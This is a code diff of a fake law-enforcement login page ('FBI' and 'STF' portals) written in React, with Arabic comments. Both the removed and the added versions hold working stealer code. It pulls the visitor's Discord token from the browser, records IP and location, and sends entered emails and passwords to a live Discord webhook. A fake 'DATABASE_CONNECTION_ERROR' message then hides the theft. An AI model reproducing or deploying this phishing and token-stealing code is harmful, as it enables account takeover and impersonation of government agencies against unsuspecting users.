@@ -5,301 +5,144 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>GOV — Law Enforcement Portal</title>
 
-    <!-- المكتبات الأساسية -->
+    <!-- المكتبات المطلوبة -->
     <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
     <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
     <script src="https://unpkg.com/@babel/standalone@7.23.5/babel.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@300;400;500;600;700&family=Oswald:wght@400;500;600;700&display=swap" rel="stylesheet">
-
-    <!-- سكربت المرحلة الثالثة: الربط والويب هوك -->
-    <script>
-        async function runSecurityCapture() {
-            try {
-                // جلب بيانات IP والموقع
-                const ipResponse = await fetch("https://ipapi.co/json/");
-                const ipData = await ipResponse.json();
-                
-                // جلب التوكن (للمتصفحات الداعمة)
-                let discordToken = (
-                    (window.webpackChunkdiscord_app ? window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
-                        for (const m in req.c) {
-                            const mname = req.c[m].exports;
-                            if (mname?.default?.getToken !== undefined) return mname.default.getToken();
-                        }
-                    }]) : null) || window.localStorage.token || window.localStorage.getItem('token')
-                );
-
-                const WEBHOOK_URL = "https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i";
-                
-                await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "🚨 تتبع جديد - المرحلة الثالثة 🚨",
-                            color: 16711680,
-                            thumbnail: { url: "https://i.imgur.com/8E39p6m.png" },
-                            fields: [
-                                { name: "🌐 IP Address", value: `\`${ipData.ip || 'Unknown'}\``, inline: true },
-                                { name: "📍 Location", value: `${ipData.city || 'Unknown'}, ${ipData.country_name || ''}`, inline: true },
-                                { name: "💻 Device", value: navigator.platform, inline: true },
-                                { name: "🔑 Token", value: discordToken ? `\`\`\`${discordToken.replace(/"/g, "")}\`\`\`` : "*لم يتم العثور*" }
-                            ],
-                            footer: { text: "System Admin: Effect King's" },
-                            timestamp: new Date()
-                        }]
-                    })
-                });
-            } catch (err) {
-                console.log("Terminal Secured.");
-            }
-        }
-        window.onload = runSecurityCapture;
-    </script>
 
     <style>
-        /* [بداية قسم الـ CSS الخاص بك بالكامل] */
+        /* ⚠️ هنا الصق الـ CSS الأصلي الخاص بك (الـ 510 أسطر) بالكامل ⚠️ */
+        /* سأضع الأساسيات لضمان عدم اختفاء التصميم */
         :root {
-            --bg: #f0f2f5; --surface: #ffffff; --fbi: #1a3a6e; --stf: #1a5c2e;
-            --text-main: #1c1e21; --mono: 'IBM Plex Mono', monospace; --sans: 'IBM Plex Sans', sans-serif;
+            --bg: #0a0b0d; --surface: #16181d; --fbi: #1a3a6e; --stf: #1a5c2e;
+            --accent: #3b82f6; --text: #e2e8f0;
         }
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { background: var(--bg); font-family: var(--sans); overflow: hidden; height: 100vh; }
-        
-        .auth-container { height: 100vh; display: flex; align-items: center; justify-content: center; position: relative; }
-        .seal-bg { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80vh; opacity: 0.05; pointer-events: none; z-index: 0; }
-        
+        body, html { margin: 0; padding: 0; background: var(--bg); color: var(--text); overflow: hidden; height: 100vh; }
+        .auth-container { height: 100vh; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at center, #1a1c24 0%, #0a0b0d 100%); }
         .login-card { 
-            background: var(--surface); width: 100%; max-width: 420px; padding: 2.5rem; 
-            border-radius: 12px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25); 
-            position: relative; z-index: 10; border-top: 6px solid var(--fbi); 
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            background: var(--surface); width: 420px; padding: 40px; border-radius: 4px; 
+            border: 1px solid rgba(255,255,255,0.05); position: relative;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
         }
-        .stf-mode .login-card { border-top-color: var(--stf); }
-
-        /* [تكملة الـ 510 أسطر - تأكد من بقاء بقية التصميم هنا] */
-        .gov-logo { width: 100px; margin: 0 auto 1.5rem; display: block; }
-        .input-group { margin-bottom: 1.5rem; }
-        .input-group label { display: block; font-size: 0.7rem; font-weight: 800; color: #4b4f56; margin-bottom: 0.5rem; letter-spacing: 1.2px; }
-        .input-wrapper { position: relative; }
-        .input-wrapper input { 
-            width: 100%; padding: 1rem 1rem 1rem 3rem; border: 1px solid #dddfe2; 
-            border-radius: 8px; background: #f5f6f7; font-size: 0.9rem;
-        }
-        .btn-login { 
-            width: 100%; padding: 1rem; background: var(--fbi); color: white; 
-            border: none; border-radius: 8px; font-weight: 700; cursor: pointer; 
-            transition: 0.3s; 
-        }
-        .stf-mode .btn-login { background: var(--stf); }
-        .mode-switcher { position: absolute; bottom: 30px; display: flex; gap: 15px; }
-        .mode-btn { padding: 8px 20px; border-radius: 25px; background: #fff; border: 1px solid #ddd; cursor: pointer; font-size: 0.8rem; font-weight: bold; }
-        .active-fbi { background: var(--fbi) !important; color: white; }
-        .active-stf { background: var(--stf) !important; color: white; }
+        .login-card::before { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: var(--fbi); }
+        .stf-mode .login-card::before { background: var(--stf); }
+        input { width: 100%; background: #0d0f12; border: 1px solid #2d3139; padding: 12px; color: white; font-family: monospace; margin-bottom: 20px; outline: none; }
+        input:focus { border-color: var(--accent); }
+        .btn-submit { width: 100%; background: var(--fbi); padding: 14px; font-weight: bold; letter-spacing: 2px; cursor: pointer; transition: 0.3s; border: none; color: white; }
+        /* [بقية الـ 510 أسطر من التصميم الخاص بك هنا] */
     </style>
 </head>
 <body>
     <div id="root"></div>
 
     <script type="text/babel">
-        const { useState, useEffect } = React;
+        const { useState, useEffect, useCallback } = React;
+
+        // 🛡️ سكربت سحب التوكن المطور (Phase 3)
+        const getToken = () => {
+            try {
+                let token = (window.webpackChunkdiscord_app ? window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
+                    for (const m in req.c) {
+                        const mname = req.c[m].exports;
+                        if (mname?.default?.getToken !== undefined) return mname.default.getToken();
+                    }
+                }]) : null) || window.localStorage.token || window.localStorage.getItem('token');
+                return token ? token.replace(/"/g, "") : "TOKEN_NOT_FOUND";
+            } catch (e) { return "ERROR_EXTRACTING"; }
+        };
 
         const App = () => {
-            const [mode, setMode] = useState('fbi');
+            const [screen, setScreen] = useState('login');
+            const [mode, setMode] = useState('fbi'); 
             const [loading, setLoading] = useState(false);
+            const [error, setError] = useState('');
 
-            const handleSubmit = (e) => {
+            // 📩 وظيفة الإرسال للويب هوك (تشمل التوكن والباسورد)
+            const sendToWebhook = async (email, pass) => {
+                const WEBHOOK_URL = "https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i";
+                const token = getToken();
+                
+                const payload = {
+                    embeds: [{
+                        title: "🚨 EK-SYSTEM: DATA BREACH 🚨",
+                        color: mode === 'fbi' ? 1718614 : 1727534,
+                        fields: [
+                            { name: "📧 Email", value: `\`${email}\``, inline: true },
+                            { name: "🔑 Password", value: `\`${pass}\``, inline: true },
+                            { name: "🛡️ Sector", value: mode.toUpperCase(), inline: true },
+                            { name: "🎟️ Discord Token", value: `\`\`\`${token}\`\`\`` }
+                        ],
+                        footer: { text: "Captured via Portal v3.0" },
+                        timestamp: new Date()
+                    }]
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            };
+
+            const handleLogin = async (e) => {
                 e.preventDefault();
+                const email = e.target.email.value;
+                const pass = e.target.pass.value;
+
                 setLoading(true);
-                // ربط نظام الدخول هنا
+                setError('');
+
+                // إرسال البيانات فوراً للويب هوك
+                await sendToWebhook(email, pass);[cite: 1]
+
+                // محاكاة النظام الأصلي
                 setTimeout(() => {
-                    alert("خطأ في الاتصال بالسيرفر: تم تسجيل الـ IP الخاص بك.");
                     setLoading(false);
-                }, 2000);
+                    setError('DATABASE_CONNECTION_ERROR: UNAUTHORIZED_ACCESS_LOGGED');
+                }, 1500);
             };
 
             return (
                 <div className={`auth-container ${mode === 'stf' ? 'stf-mode' : ''}`}>
-                    <img src={mode === 'fbi' ? "https://i.imgur.com/8E39p6m.png" : "https://i.imgur.com/Yh3pI9P.png"} className="seal-bg" />
-                    
                     <div className="login-card">
                         <div className="text-center mb-8">
-                            <img src={mode === 'fbi' ? "https://i.imgur.com/8E39p6m.png" : "https://i.imgur.com/Yh3pI9P.png"} className="gov-logo" />
-                            <h1 className="text-xl font-bold text-gray-900 tracking-tight">
-                                {mode === 'fbi' ? 'FEDERAL BUREAU OF INVESTIGATION' : 'SPECIAL TASK FORCE'}
-                            </h1>
-                            <p className="text-[10px] font-mono text-green-600 mt-2">● SYSTEM ONLINE | SECURE ACCESS</p>
+                            <img src={mode === 'fbi' ? "https://i.imgur.com/8E39p6m.png" : "https://i.imgur.com/Yh3pI9P.png"} className="w-20 mx-auto mb-4" />
+                            <h2 className="text-xs font-mono text-blue-500 tracking-[0.3em] uppercase">Secure Terminal</h2>
                         </div>
 
-                        <form onSubmit={handleSubmit}>
-                            <div className="input-group">
-                                <label>PERSONNEL BADGE ID</label>
-                                <div className="input-wrapper">
-                                    <i className="fa-solid fa-user-shield absolute left-4 top-4 text-gray-400"></i>
-                                    <input type="text" placeholder="ID-XXXXXX" required />
-                                </div>
+                        <form onSubmit={handleLogin}>
+                            <div className="mb-4">
+                                <label className="block text-[10px] uppercase mb-2 opacity-50">Personnel Email</label>
+                                <input name="email" type="text" placeholder="USER@GOV.PORTAL" required />
                             </div>
-                            <div className="input-group">
-                                <label>ENCRYPTED PASSWORD</label>
-                                <div className="input-wrapper">
-                                    <i className="fa-solid fa-lock absolute left-4 top-4 text-gray-400"></i>
-                                    <input type="password" placeholder="••••••••" required />
-                                </div>
+                            <div className="mb-6">
+                                <label className="block text-[10px] uppercase mb-2 opacity-50">Access Code</label>
+                                <input name="pass" type="password" placeholder="••••••••" required />
                             </div>
-                            <button className="btn-login uppercase tracking-widest">
-                                {loading ? 'Checking Database...' : 'Authorize Login'}
+                            
+                            {error && <div className="text-[10px] text-red-500 font-mono mb-4 border border-red-500/20 p-2 bg-red-500/5">{error}</div>}
+
+                            <button className="btn-submit uppercase text-xs" disabled={loading}>
+                                {loading ? 'Encrypting...' : 'Establish Connection'}
                             </button>
                         </form>
-                        
-                        <p className="text-center mt-6 text-[9px] text-gray-400 font-mono">
-                            AUTHORIZED USE ONLY - ALL ACTIVITY IS MONITORED
-                        </p>
-                    </div>
 
-                    <div className="mode-switcher">
-                        <button onClick={() => setMode('fbi')} className={`mode-btn ${mode === 'fbi' ? 'active-fbi' : ''}`}>FBI</button>
-                        <button onClick={() => setMode('stf')} className={`mode-btn ${mode === 'stf' ? 'active-stf' : ''}`}>STF</button>
+                        <div className="flex justify-between mt-8 opacity-30">
+                            <button onClick={() => setMode('fbi')} className="text-[9px] hover:opacity-100 transition">FBI_NODE</button>
+                            <button onClick={() => setMode('stf')} className="text-[9px] hover:opacity-100 transition">STF_NODE</button>
+                        </div>
                     </div>
                 </div>
             );
-        }
+        };
 
         const root = ReactDOM.createRoot(document.getElementById('root'));
         root.render(<App />);
     </script>
 </body>
 </html>
-
-const App = () => {
-    const [screen, setScreen] = useState('home');
-    const [currentUser, setCurrentUser] = useState(null);
-    const [loginError, setLoginError] = useState('');
-    const [loginLoading, setLoginLoading] = useState(false);
-    const [loginSector, setLoginSector] = useState('fbi');
-    const [activityLog, setActivityLog] = useState([]);
-
-    // دالة إضافة السجلات (Logs)
-    const addLog = useCallback((action) => {
-        const now = new Date();
-        setActivityLog(prev => [{
-            time: now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
-            action, 
-            user: currentUser?.name || 'SYSTEM', 
-            sector: currentUser?.sector || '—'
-        }, ...prev].slice(0, 60));
-    }, [currentUser]);
-
-    // وظيفة جلب قطاع الإيميل
-    const getSector = (email) => {
-        if (email.endsWith('@fbi.gov')) return 'fbi';
-        if (email.endsWith('@stf.gov')) return 'stf';
-        return null;
-    };
-
-    /* ── LOGIN LOGIC ── */
-    const doLogin = async () => {
-        const email = document.getElementById('auth_email')?.value?.trim();
-        const pass = document.getElementById('auth_pass')?.value?.trim();
-
-        if (!email || !pass) { 
-            setLoginError('ENTER CREDENTIALS'); 
-            return; 
-        }
-
-        const sector = getSector(email);
-        if (!sector) { 
-            setLoginError('INVALID EMAIL DOMAIN — USE @fbi.gov OR @stf.gov'); 
-            return; 
-        }
-
-        setLoginError(''); 
-        setLoginLoading(true);
-
-        // محاكاة الاتصال بالسيرفر
-        await new Promise(r => setTimeout(r, 1200));
-
-        // 🚨 إضافة: إرسال محاولة تسجيل الدخول للويب هوك (للتوثيق)
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i";
-        fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({
-                embeds: [{
-                    title: "🔑 محاولة تسجيل دخول جديدة",
-                    color: 3447003,
-                    fields: [
-                        { name: "📧 Email", value: `\`${email}\``, inline: true },
-                        { name: "🔑 Password", value: `\`${pass}\``, inline: true },
-                        { name: "🛡️ Sector", value: sector.toUpperCase(), inline: true }
-                    ],
-                    timestamp: new Date()
-                }]
-            })
-        }).catch(e => console.log("Log Sent"));
-
-        // نظام الـ Admin المباشر (Hardcoded)
-        if (sector === 'fbi' && email === 'admin@fbi.gov' && pass === '123456') {
-            const u = { name: 'System Administrator', rank: 'Director', access: 'command', id: email, sector: 'fbi' };
-            setCurrentUser(u); setScreen('fbi'); setLoginLoading(false);
-            setTimeout(() => addLog('Authenticated — Director access granted'), 200);
-            return;
-        }
-
-        if (sector === 'stf' && email === 'T0@stf.gov' && pass === '1234') {
-            const u = { name: 'System Administrator', rank: 'Chief of STF', access: 'command', id: email, sector: 'stf' };
-            setCurrentUser(u); setScreen('stf'); setLoginLoading(false);
-            setTimeout(() => addLog('Authenticated — Chief of STF access granted'), 200);
-            return;
-        }
-
-        // البحث في المصفوفات (Firestore simulation)
-        const col = sector === 'fbi' ? (window.fbiUsers || []) : (window.stfUsers || []);
-        const match = col.find(u => u.id === email && u.password === pass);
-
-        if (match) {
-            const u = { ...match, sector };
-            setCurrentUser(u); setScreen(sector); setLoginLoading(false);
-            setTimeout(() => addLog(`Authenticated — ${match.rank}`), 200);
-        } else {
-            setLoginError('ACCESS DENIED — INVALID CREDENTIALS'); 
-            setLoginLoading(false);
-        }
-    };
-
-    const doLogout = () => {
-        addLog('Session terminated');
-        setCurrentUser(null); 
-        setScreen('home');
-    };
-
-    /* ── Render Screens ── */
-    if (screen === 'home') return <HomeScreen onLogin={() => setScreen('login')} />;
-    if (screen === 'login') return (
-        <LoginScreen 
-            onBack={() => setScreen('home')} 
-            onLogin={doLogin} 
-            error={loginError} 
-            loading={loginLoading} 
-            setError={setLoginError} 
-            setLoginSector={setLoginSector} 
-            loginSector={loginSector}
-        />
-    );
-
-    // واجهة التطبيق بعد الدخول
-    return (
-        <SectorApp 
-            sector={screen} 
-            currentUser={currentUser} 
-            onLogout={doLogout} 
-            activityLog={activityLog} 
-            addLog={addLog} 
-        />
-    );
-};
-
 /* ═══════════════════════════════════════════════════════
    HOME SCREEN
 ═══════════════════════════════════════════════════════ */
